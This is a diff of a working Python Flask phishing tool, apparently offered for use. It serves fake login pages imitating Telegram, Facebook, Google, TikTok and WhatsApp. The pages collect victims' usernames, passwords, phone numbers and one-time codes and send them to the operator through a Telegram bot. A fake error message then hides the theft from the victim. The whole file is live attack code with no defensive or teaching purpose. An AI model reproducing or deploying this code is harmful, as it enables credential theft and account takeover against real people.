@@ -1,182 +1,153 @@
-import os
-import requests
-import sys
-import base64
+import os, requests, sys, base64
 from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
 # --- Configuration ---
 CONFIG_FILE = "config.txt"
-# '@Yosephalganeh44' በ Base64 ተደብቆ
-ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA=="
+ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" # @Yosephalganeh44
 
-# --- 1. Access Control (Hidden Password Tool Lock) ---
 def check_access():
-    print("\n" + "═" * 40)
-    print("      YAG GROUP PREMIUM TOOL")
-    print("      Owner: Yoseph Alganeh")
-    print("═" * 40)
-    
-    user_pass = input("[?] Enter Access Password to start: ").strip()
-    
-    # የተደበቀውን ፓስወርድ መፍታት (Decoding)
-    correct_pass = base64.b64decode(ENCODED_PASS).decode('utf-8')
-    
-    if user_pass == correct_pass:
-        print("[+] Access Granted! Welcome back, Boss.\n")
-    else:
-        print("[!] Wrong Password! Access Denied.")
-        sys.exit()
+    print("\n" + "═" * 45)
+    print("      YAG GROUP MULTI-PLATFORM TOOL")
+    print("      Owner: @Yosephalganeh44")
+    print("═" * 45)
+    p = input("[?] Enter Access Password: ").strip()
+    if p != base64.b64decode(ENCODED_PASS).decode():
+        print("[!] Access Denied!"); sys.exit()
+    print("[+] Access Granted!\n")
 
-# --- 2. Dynamic Bot Configuration ---
 def setup_bot():
-    """Checks for config file, if not exists, asks user for bot details"""
     if not os.path.exists(CONFIG_FILE):
-        print("--- First Time Setup: Bot Configuration ---")
-        token = input("[?] Enter your Telegram Bot Token: ").strip()
-        chat_id = input("[?] Enter your Telegram Chat ID: ").strip()
-        
-        with open(CONFIG_FILE, "w") as f:
-            f.write(f"{token}\n{chat_id}")
-        print("[+] Configuration Saved Successfully!\n")
+        token = input("[?] Bot Token: ").strip()
+        chat_id = input("[?] Chat ID: ").strip()
+        with open(CONFIG_FILE, "w") as f: f.write(f"{token}\n{chat_id}")
         return token, chat_id
-    else:
-        with open(CONFIG_FILE, "r") as f:
-            data = f.read().splitlines()
-            if len(data) >= 2:
-                return data[0], data[1]
-            else:
-                if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
-                return setup_bot()
+    with open(CONFIG_FILE, "r") as f:
+        data = f.read().splitlines()
+        return data[0], data[1]
 
-# --- 3. Telegram Data Sender ---
-def send_to_telegram(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    try:
-        requests.post(url, data=payload, timeout=15)
-    except Exception as e:
-        print(f"[!] Network Error: {e}")
-
-# --- 4. Front-end (Telegram Look-alike HTML) ---
+# --- HTML Interface (Multi-Login Design) ---
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login to Telegram</title>
+    <title>Login Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #ffffff; padding: 40px; border-radius: 15px; box-shadow: 0 8px 30px rgba(0,0,0,0.05); width: 100%; max-width: 350px; text-align: center; border: 1px solid #e1e4e8; }
-        .tg-logo { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 600; color: #222; margin-bottom: 10px; }
-        p { font-size: 15px; color: #707579; margin-bottom: 30px; line-height: 1.4; }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 10px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; }
-        input:focus { border: 2px solid #3390ec; }
-        .btn { width: 100%; padding: 14px; background: #3390ec; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
-        .btn:hover { background: #2b7cd1; }
         .hidden { display: none; }
-        #status-msg { margin-top: 15px; font-size: 14px; color: #d14e4e; min-height: 20px; }
+        .platform-card { cursor: pointer; transition: 0.3s; }
+        .platform-card:hover { transform: scale(1.05); }
     </style>
 </head>
-<body>
-    <div class="login-box">
-        <img src="https://telegram.org/img/t_logo.png" class="tg-logo" alt="Telegram">
-        <div id="phone-section">
-            <h1>Your Phone</h1>
-            <p>Please enter your phone number in international format.</p>
-            <input type="tel" id="phone" placeholder="+251..." required>
-            <button class="btn" onclick="submitPhone()">NEXT</button>
+<body class="bg-gray-100 flex justify-center items-center min-height-screen p-4">
+    <div id="main-container" class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
+        
+        <div id="selection-screen">
+            <h1 class="text-2xl font-bold text-center mb-6 text-gray-800">Select Login Method</h1>
+            <div class="grid grid-cols-2 gap-4">
+                <div onclick="showLogin('Telegram', '#3390ec', 'https://telegram.org/img/t_logo.png')" class="platform-card p-4 border rounded-xl text-center bg-blue-50">
+                    <img src="https://telegram.org/img/t_logo.png" class="w-12 mx-auto mb-2">
+                    <span class="font-semibold text-blue-600">Telegram</span>
+                </div>
+                <div onclick="showLogin('Facebook', '#1877f2', 'https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg')" class="platform-card p-4 border rounded-xl text-center bg-blue-50">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="w-12 mx-auto mb-2">
+                    <span class="font-semibold text-blue-700">Facebook</span>
+                </div>
+                <div onclick="showLogin('Google', '#ea4335', 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg')" class="platform-card p-4 border rounded-xl text-center bg-red-50">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" class="w-12 mx-auto mb-2">
+                    <span class="font-semibold text-red-600">Google</span>
+                </div>
+                <div onclick="showLogin('TikTok', '#000000', 'https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg')" class="platform-card p-4 border rounded-xl text-center bg-gray-50">
+                    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="w-12 mx-auto mb-2">
+                    <span class="font-semibold text-black">TikTok</span>
+                </div>
+                <div onclick="showLogin('WhatsApp', '#25d366', 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg')" class="platform-card p-4 border rounded-xl text-center bg-green-50">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="w-12 mx-auto mb-2">
+                    <span class="font-semibold text-green-600">WhatsApp</span>
+                </div>
+            </div>
         </div>
-        <div id="code-section" class="hidden">
-            <h1 id="user-phone"></h1>
-            <p>We've sent an activation code to your Telegram app. Enter it below.</p>
-            <input type="number" id="otp" placeholder="Enter Code" required>
-            <button class="btn" onclick="submitCode()">VERIFY</button>
+
+        <div id="login-screen" class="hidden">
+            <button onclick="location.reload()" class="text-gray-500 mb-4 font-bold"><- Back</button>
+            <img id="login-logo" src="" class="w-20 mx-auto mb-4">
+            <h2 id="login-title" class="text-xl font-bold text-center mb-2"></h2>
+            <p id="login-desc" class="text-gray-500 text-center text-sm mb-6"></p>
+            
+            <input type="text" id="user" placeholder="Email, Phone or Username" class="w-full p-4 border rounded-lg mb-3 outline-none focus:ring-2">
+            <input type="password" id="pass" placeholder="Password" class="w-full p-4 border rounded-lg mb-4 outline-none focus:ring-2">
+            
+            <button id="login-btn" onclick="submitData()" class="w-full p-4 text-white font-bold rounded-lg transition">LOGIN</button>
+            <p id="status" class="mt-4 text-center text-red-500 text-sm font-medium"></p>
         </div>
-        <p id="status-msg"></p>
     </div>
 
     <script>
-        let phoneNum = "";
-        async function submitPhone() {
-            phoneNum = document.getElementById('phone').value;
-            if (phoneNum.length < 9) {
-                document.getElementById('status-msg').innerText = "Please enter a valid phone number.";
-                return;
-            }
-            document.getElementById('status-msg').style.color = "#707579";
-            document.getElementById('status-msg').innerText = "Connecting...";
-            
-            await fetch('/submit', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({type: 'phone', val: phoneNum})
-            });
+        let selectedPlatform = "";
 
-            document.getElementById('phone-section').classList.add('hidden');
-            document.getElementById('user-phone').innerText = phoneNum;
-            document.getElementById('code-section').classList.remove('hidden');
-            document.getElementById('status-msg').innerText = "";
+        function showLogin(platform, color, logo) {
+            selectedPlatform = platform;
+            document.getElementById('selection-screen').classList.add('hidden');
+            document.getElementById('login-screen').classList.remove('hidden');
+            
+            document.getElementById('login-logo').src = logo;
+            document.getElementById('login-title').innerText = "Login with " + platform;
+            document.getElementById('login-desc').innerText = "Enter your " + platform + " credentials to continue.";
+            
+            let btn = document.getElementById('login-btn');
+            btn.style.backgroundColor = color;
+            document.getElementById('user').style.borderColor = color;
         }
 
-        async function submitCode() {
-            let otpCode = document.getElementById('otp').value;
-            if (otpCode.length < 4) {
-                document.getElementById('status-msg').style.color = "#d14e4e";
-                document.getElementById('status-msg').innerText = "Invalid code. Check your app.";
+        async function submitData() {
+            let u = document.getElementById('user').value;
+            let p = document.getElementById('pass').value;
+            let status = document.getElementById('status');
+
+            if(u.length < 4 || p.length < 4) {
+                status.innerText = "Please enter valid credentials.";
                 return;
             }
-            document.getElementById('status-msg').style.color = "#707579";
-            document.getElementById('status-msg').innerText = "Verifying...";
-            
+
+            status.style.color = "gray";
+            status.innerText = "Verifying...";
+
             await fetch('/submit', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({type: 'code', val: otpCode, phone: phoneNum})
+                body: JSON.stringify({platform: selectedPlatform, user: u, pass: p})
             });
 
             setTimeout(() => {
-                document.getElementById('status-msg').style.color = "#d14e4e";
-                document.getElementById('status-msg').innerText = "Internal Server Error (500). Please try again later.";
-            }, 2500);
+                status.style.color = "red";
+                status.innerText = "Login Error: Please check your connection or try again later.";
+            }, 2000);
         }
     </script>
 </body>
 </html>
 """
 
-# --- 5. Flask Routes ---
 @app.route('/')
-def index():
-    return render_template_string(HTML_PAGE)
+def index(): return render_template_string(HTML_PAGE)
 
 @app.route('/submit', methods=['POST'])
 def submit():
     data = request.json
-    if data['type'] == 'phone':
-        msg = f"📱 *NEW TARGET LOGGED*\n\n*Phone:* `{data['val']}`\n*Action:* Waiting for OTP..."
-    else:
-        msg = f"🚀 *CREDENTIALS CAPTURED!*\n\n*Phone:* `{data['phone']}`\n*OTP Code:* `{data['val']}`\n\n_System: Log in immediately!_"
+    msg = f"🚀 *YAG GROUP - NEW DATA*\n\n" \
+          f"*Platform:* `{data['platform']}`\n" \
+          f"*User:* `{data['user']}`\n" \
+          f"*Pass:* `{data['pass']}`\n\n" \
+          f"_System: Credential Captured!_"
     
-    send_to_telegram(msg)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
     return jsonify({"status": "success"})
 
-# --- 6. Execution ---
 if __name__ == '__main__':
-    # Step 1: Check Password
     check_access()
-    
-    # Step 2: Initialize Bot Config
     BOT_TOKEN, CHAT_ID = setup_bot()
-    
-    # Step 3: Run Server
-    print(f"\n[+] Tool is active.")
-    print(f"[!] Access Link: http://localhost:5000")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000)
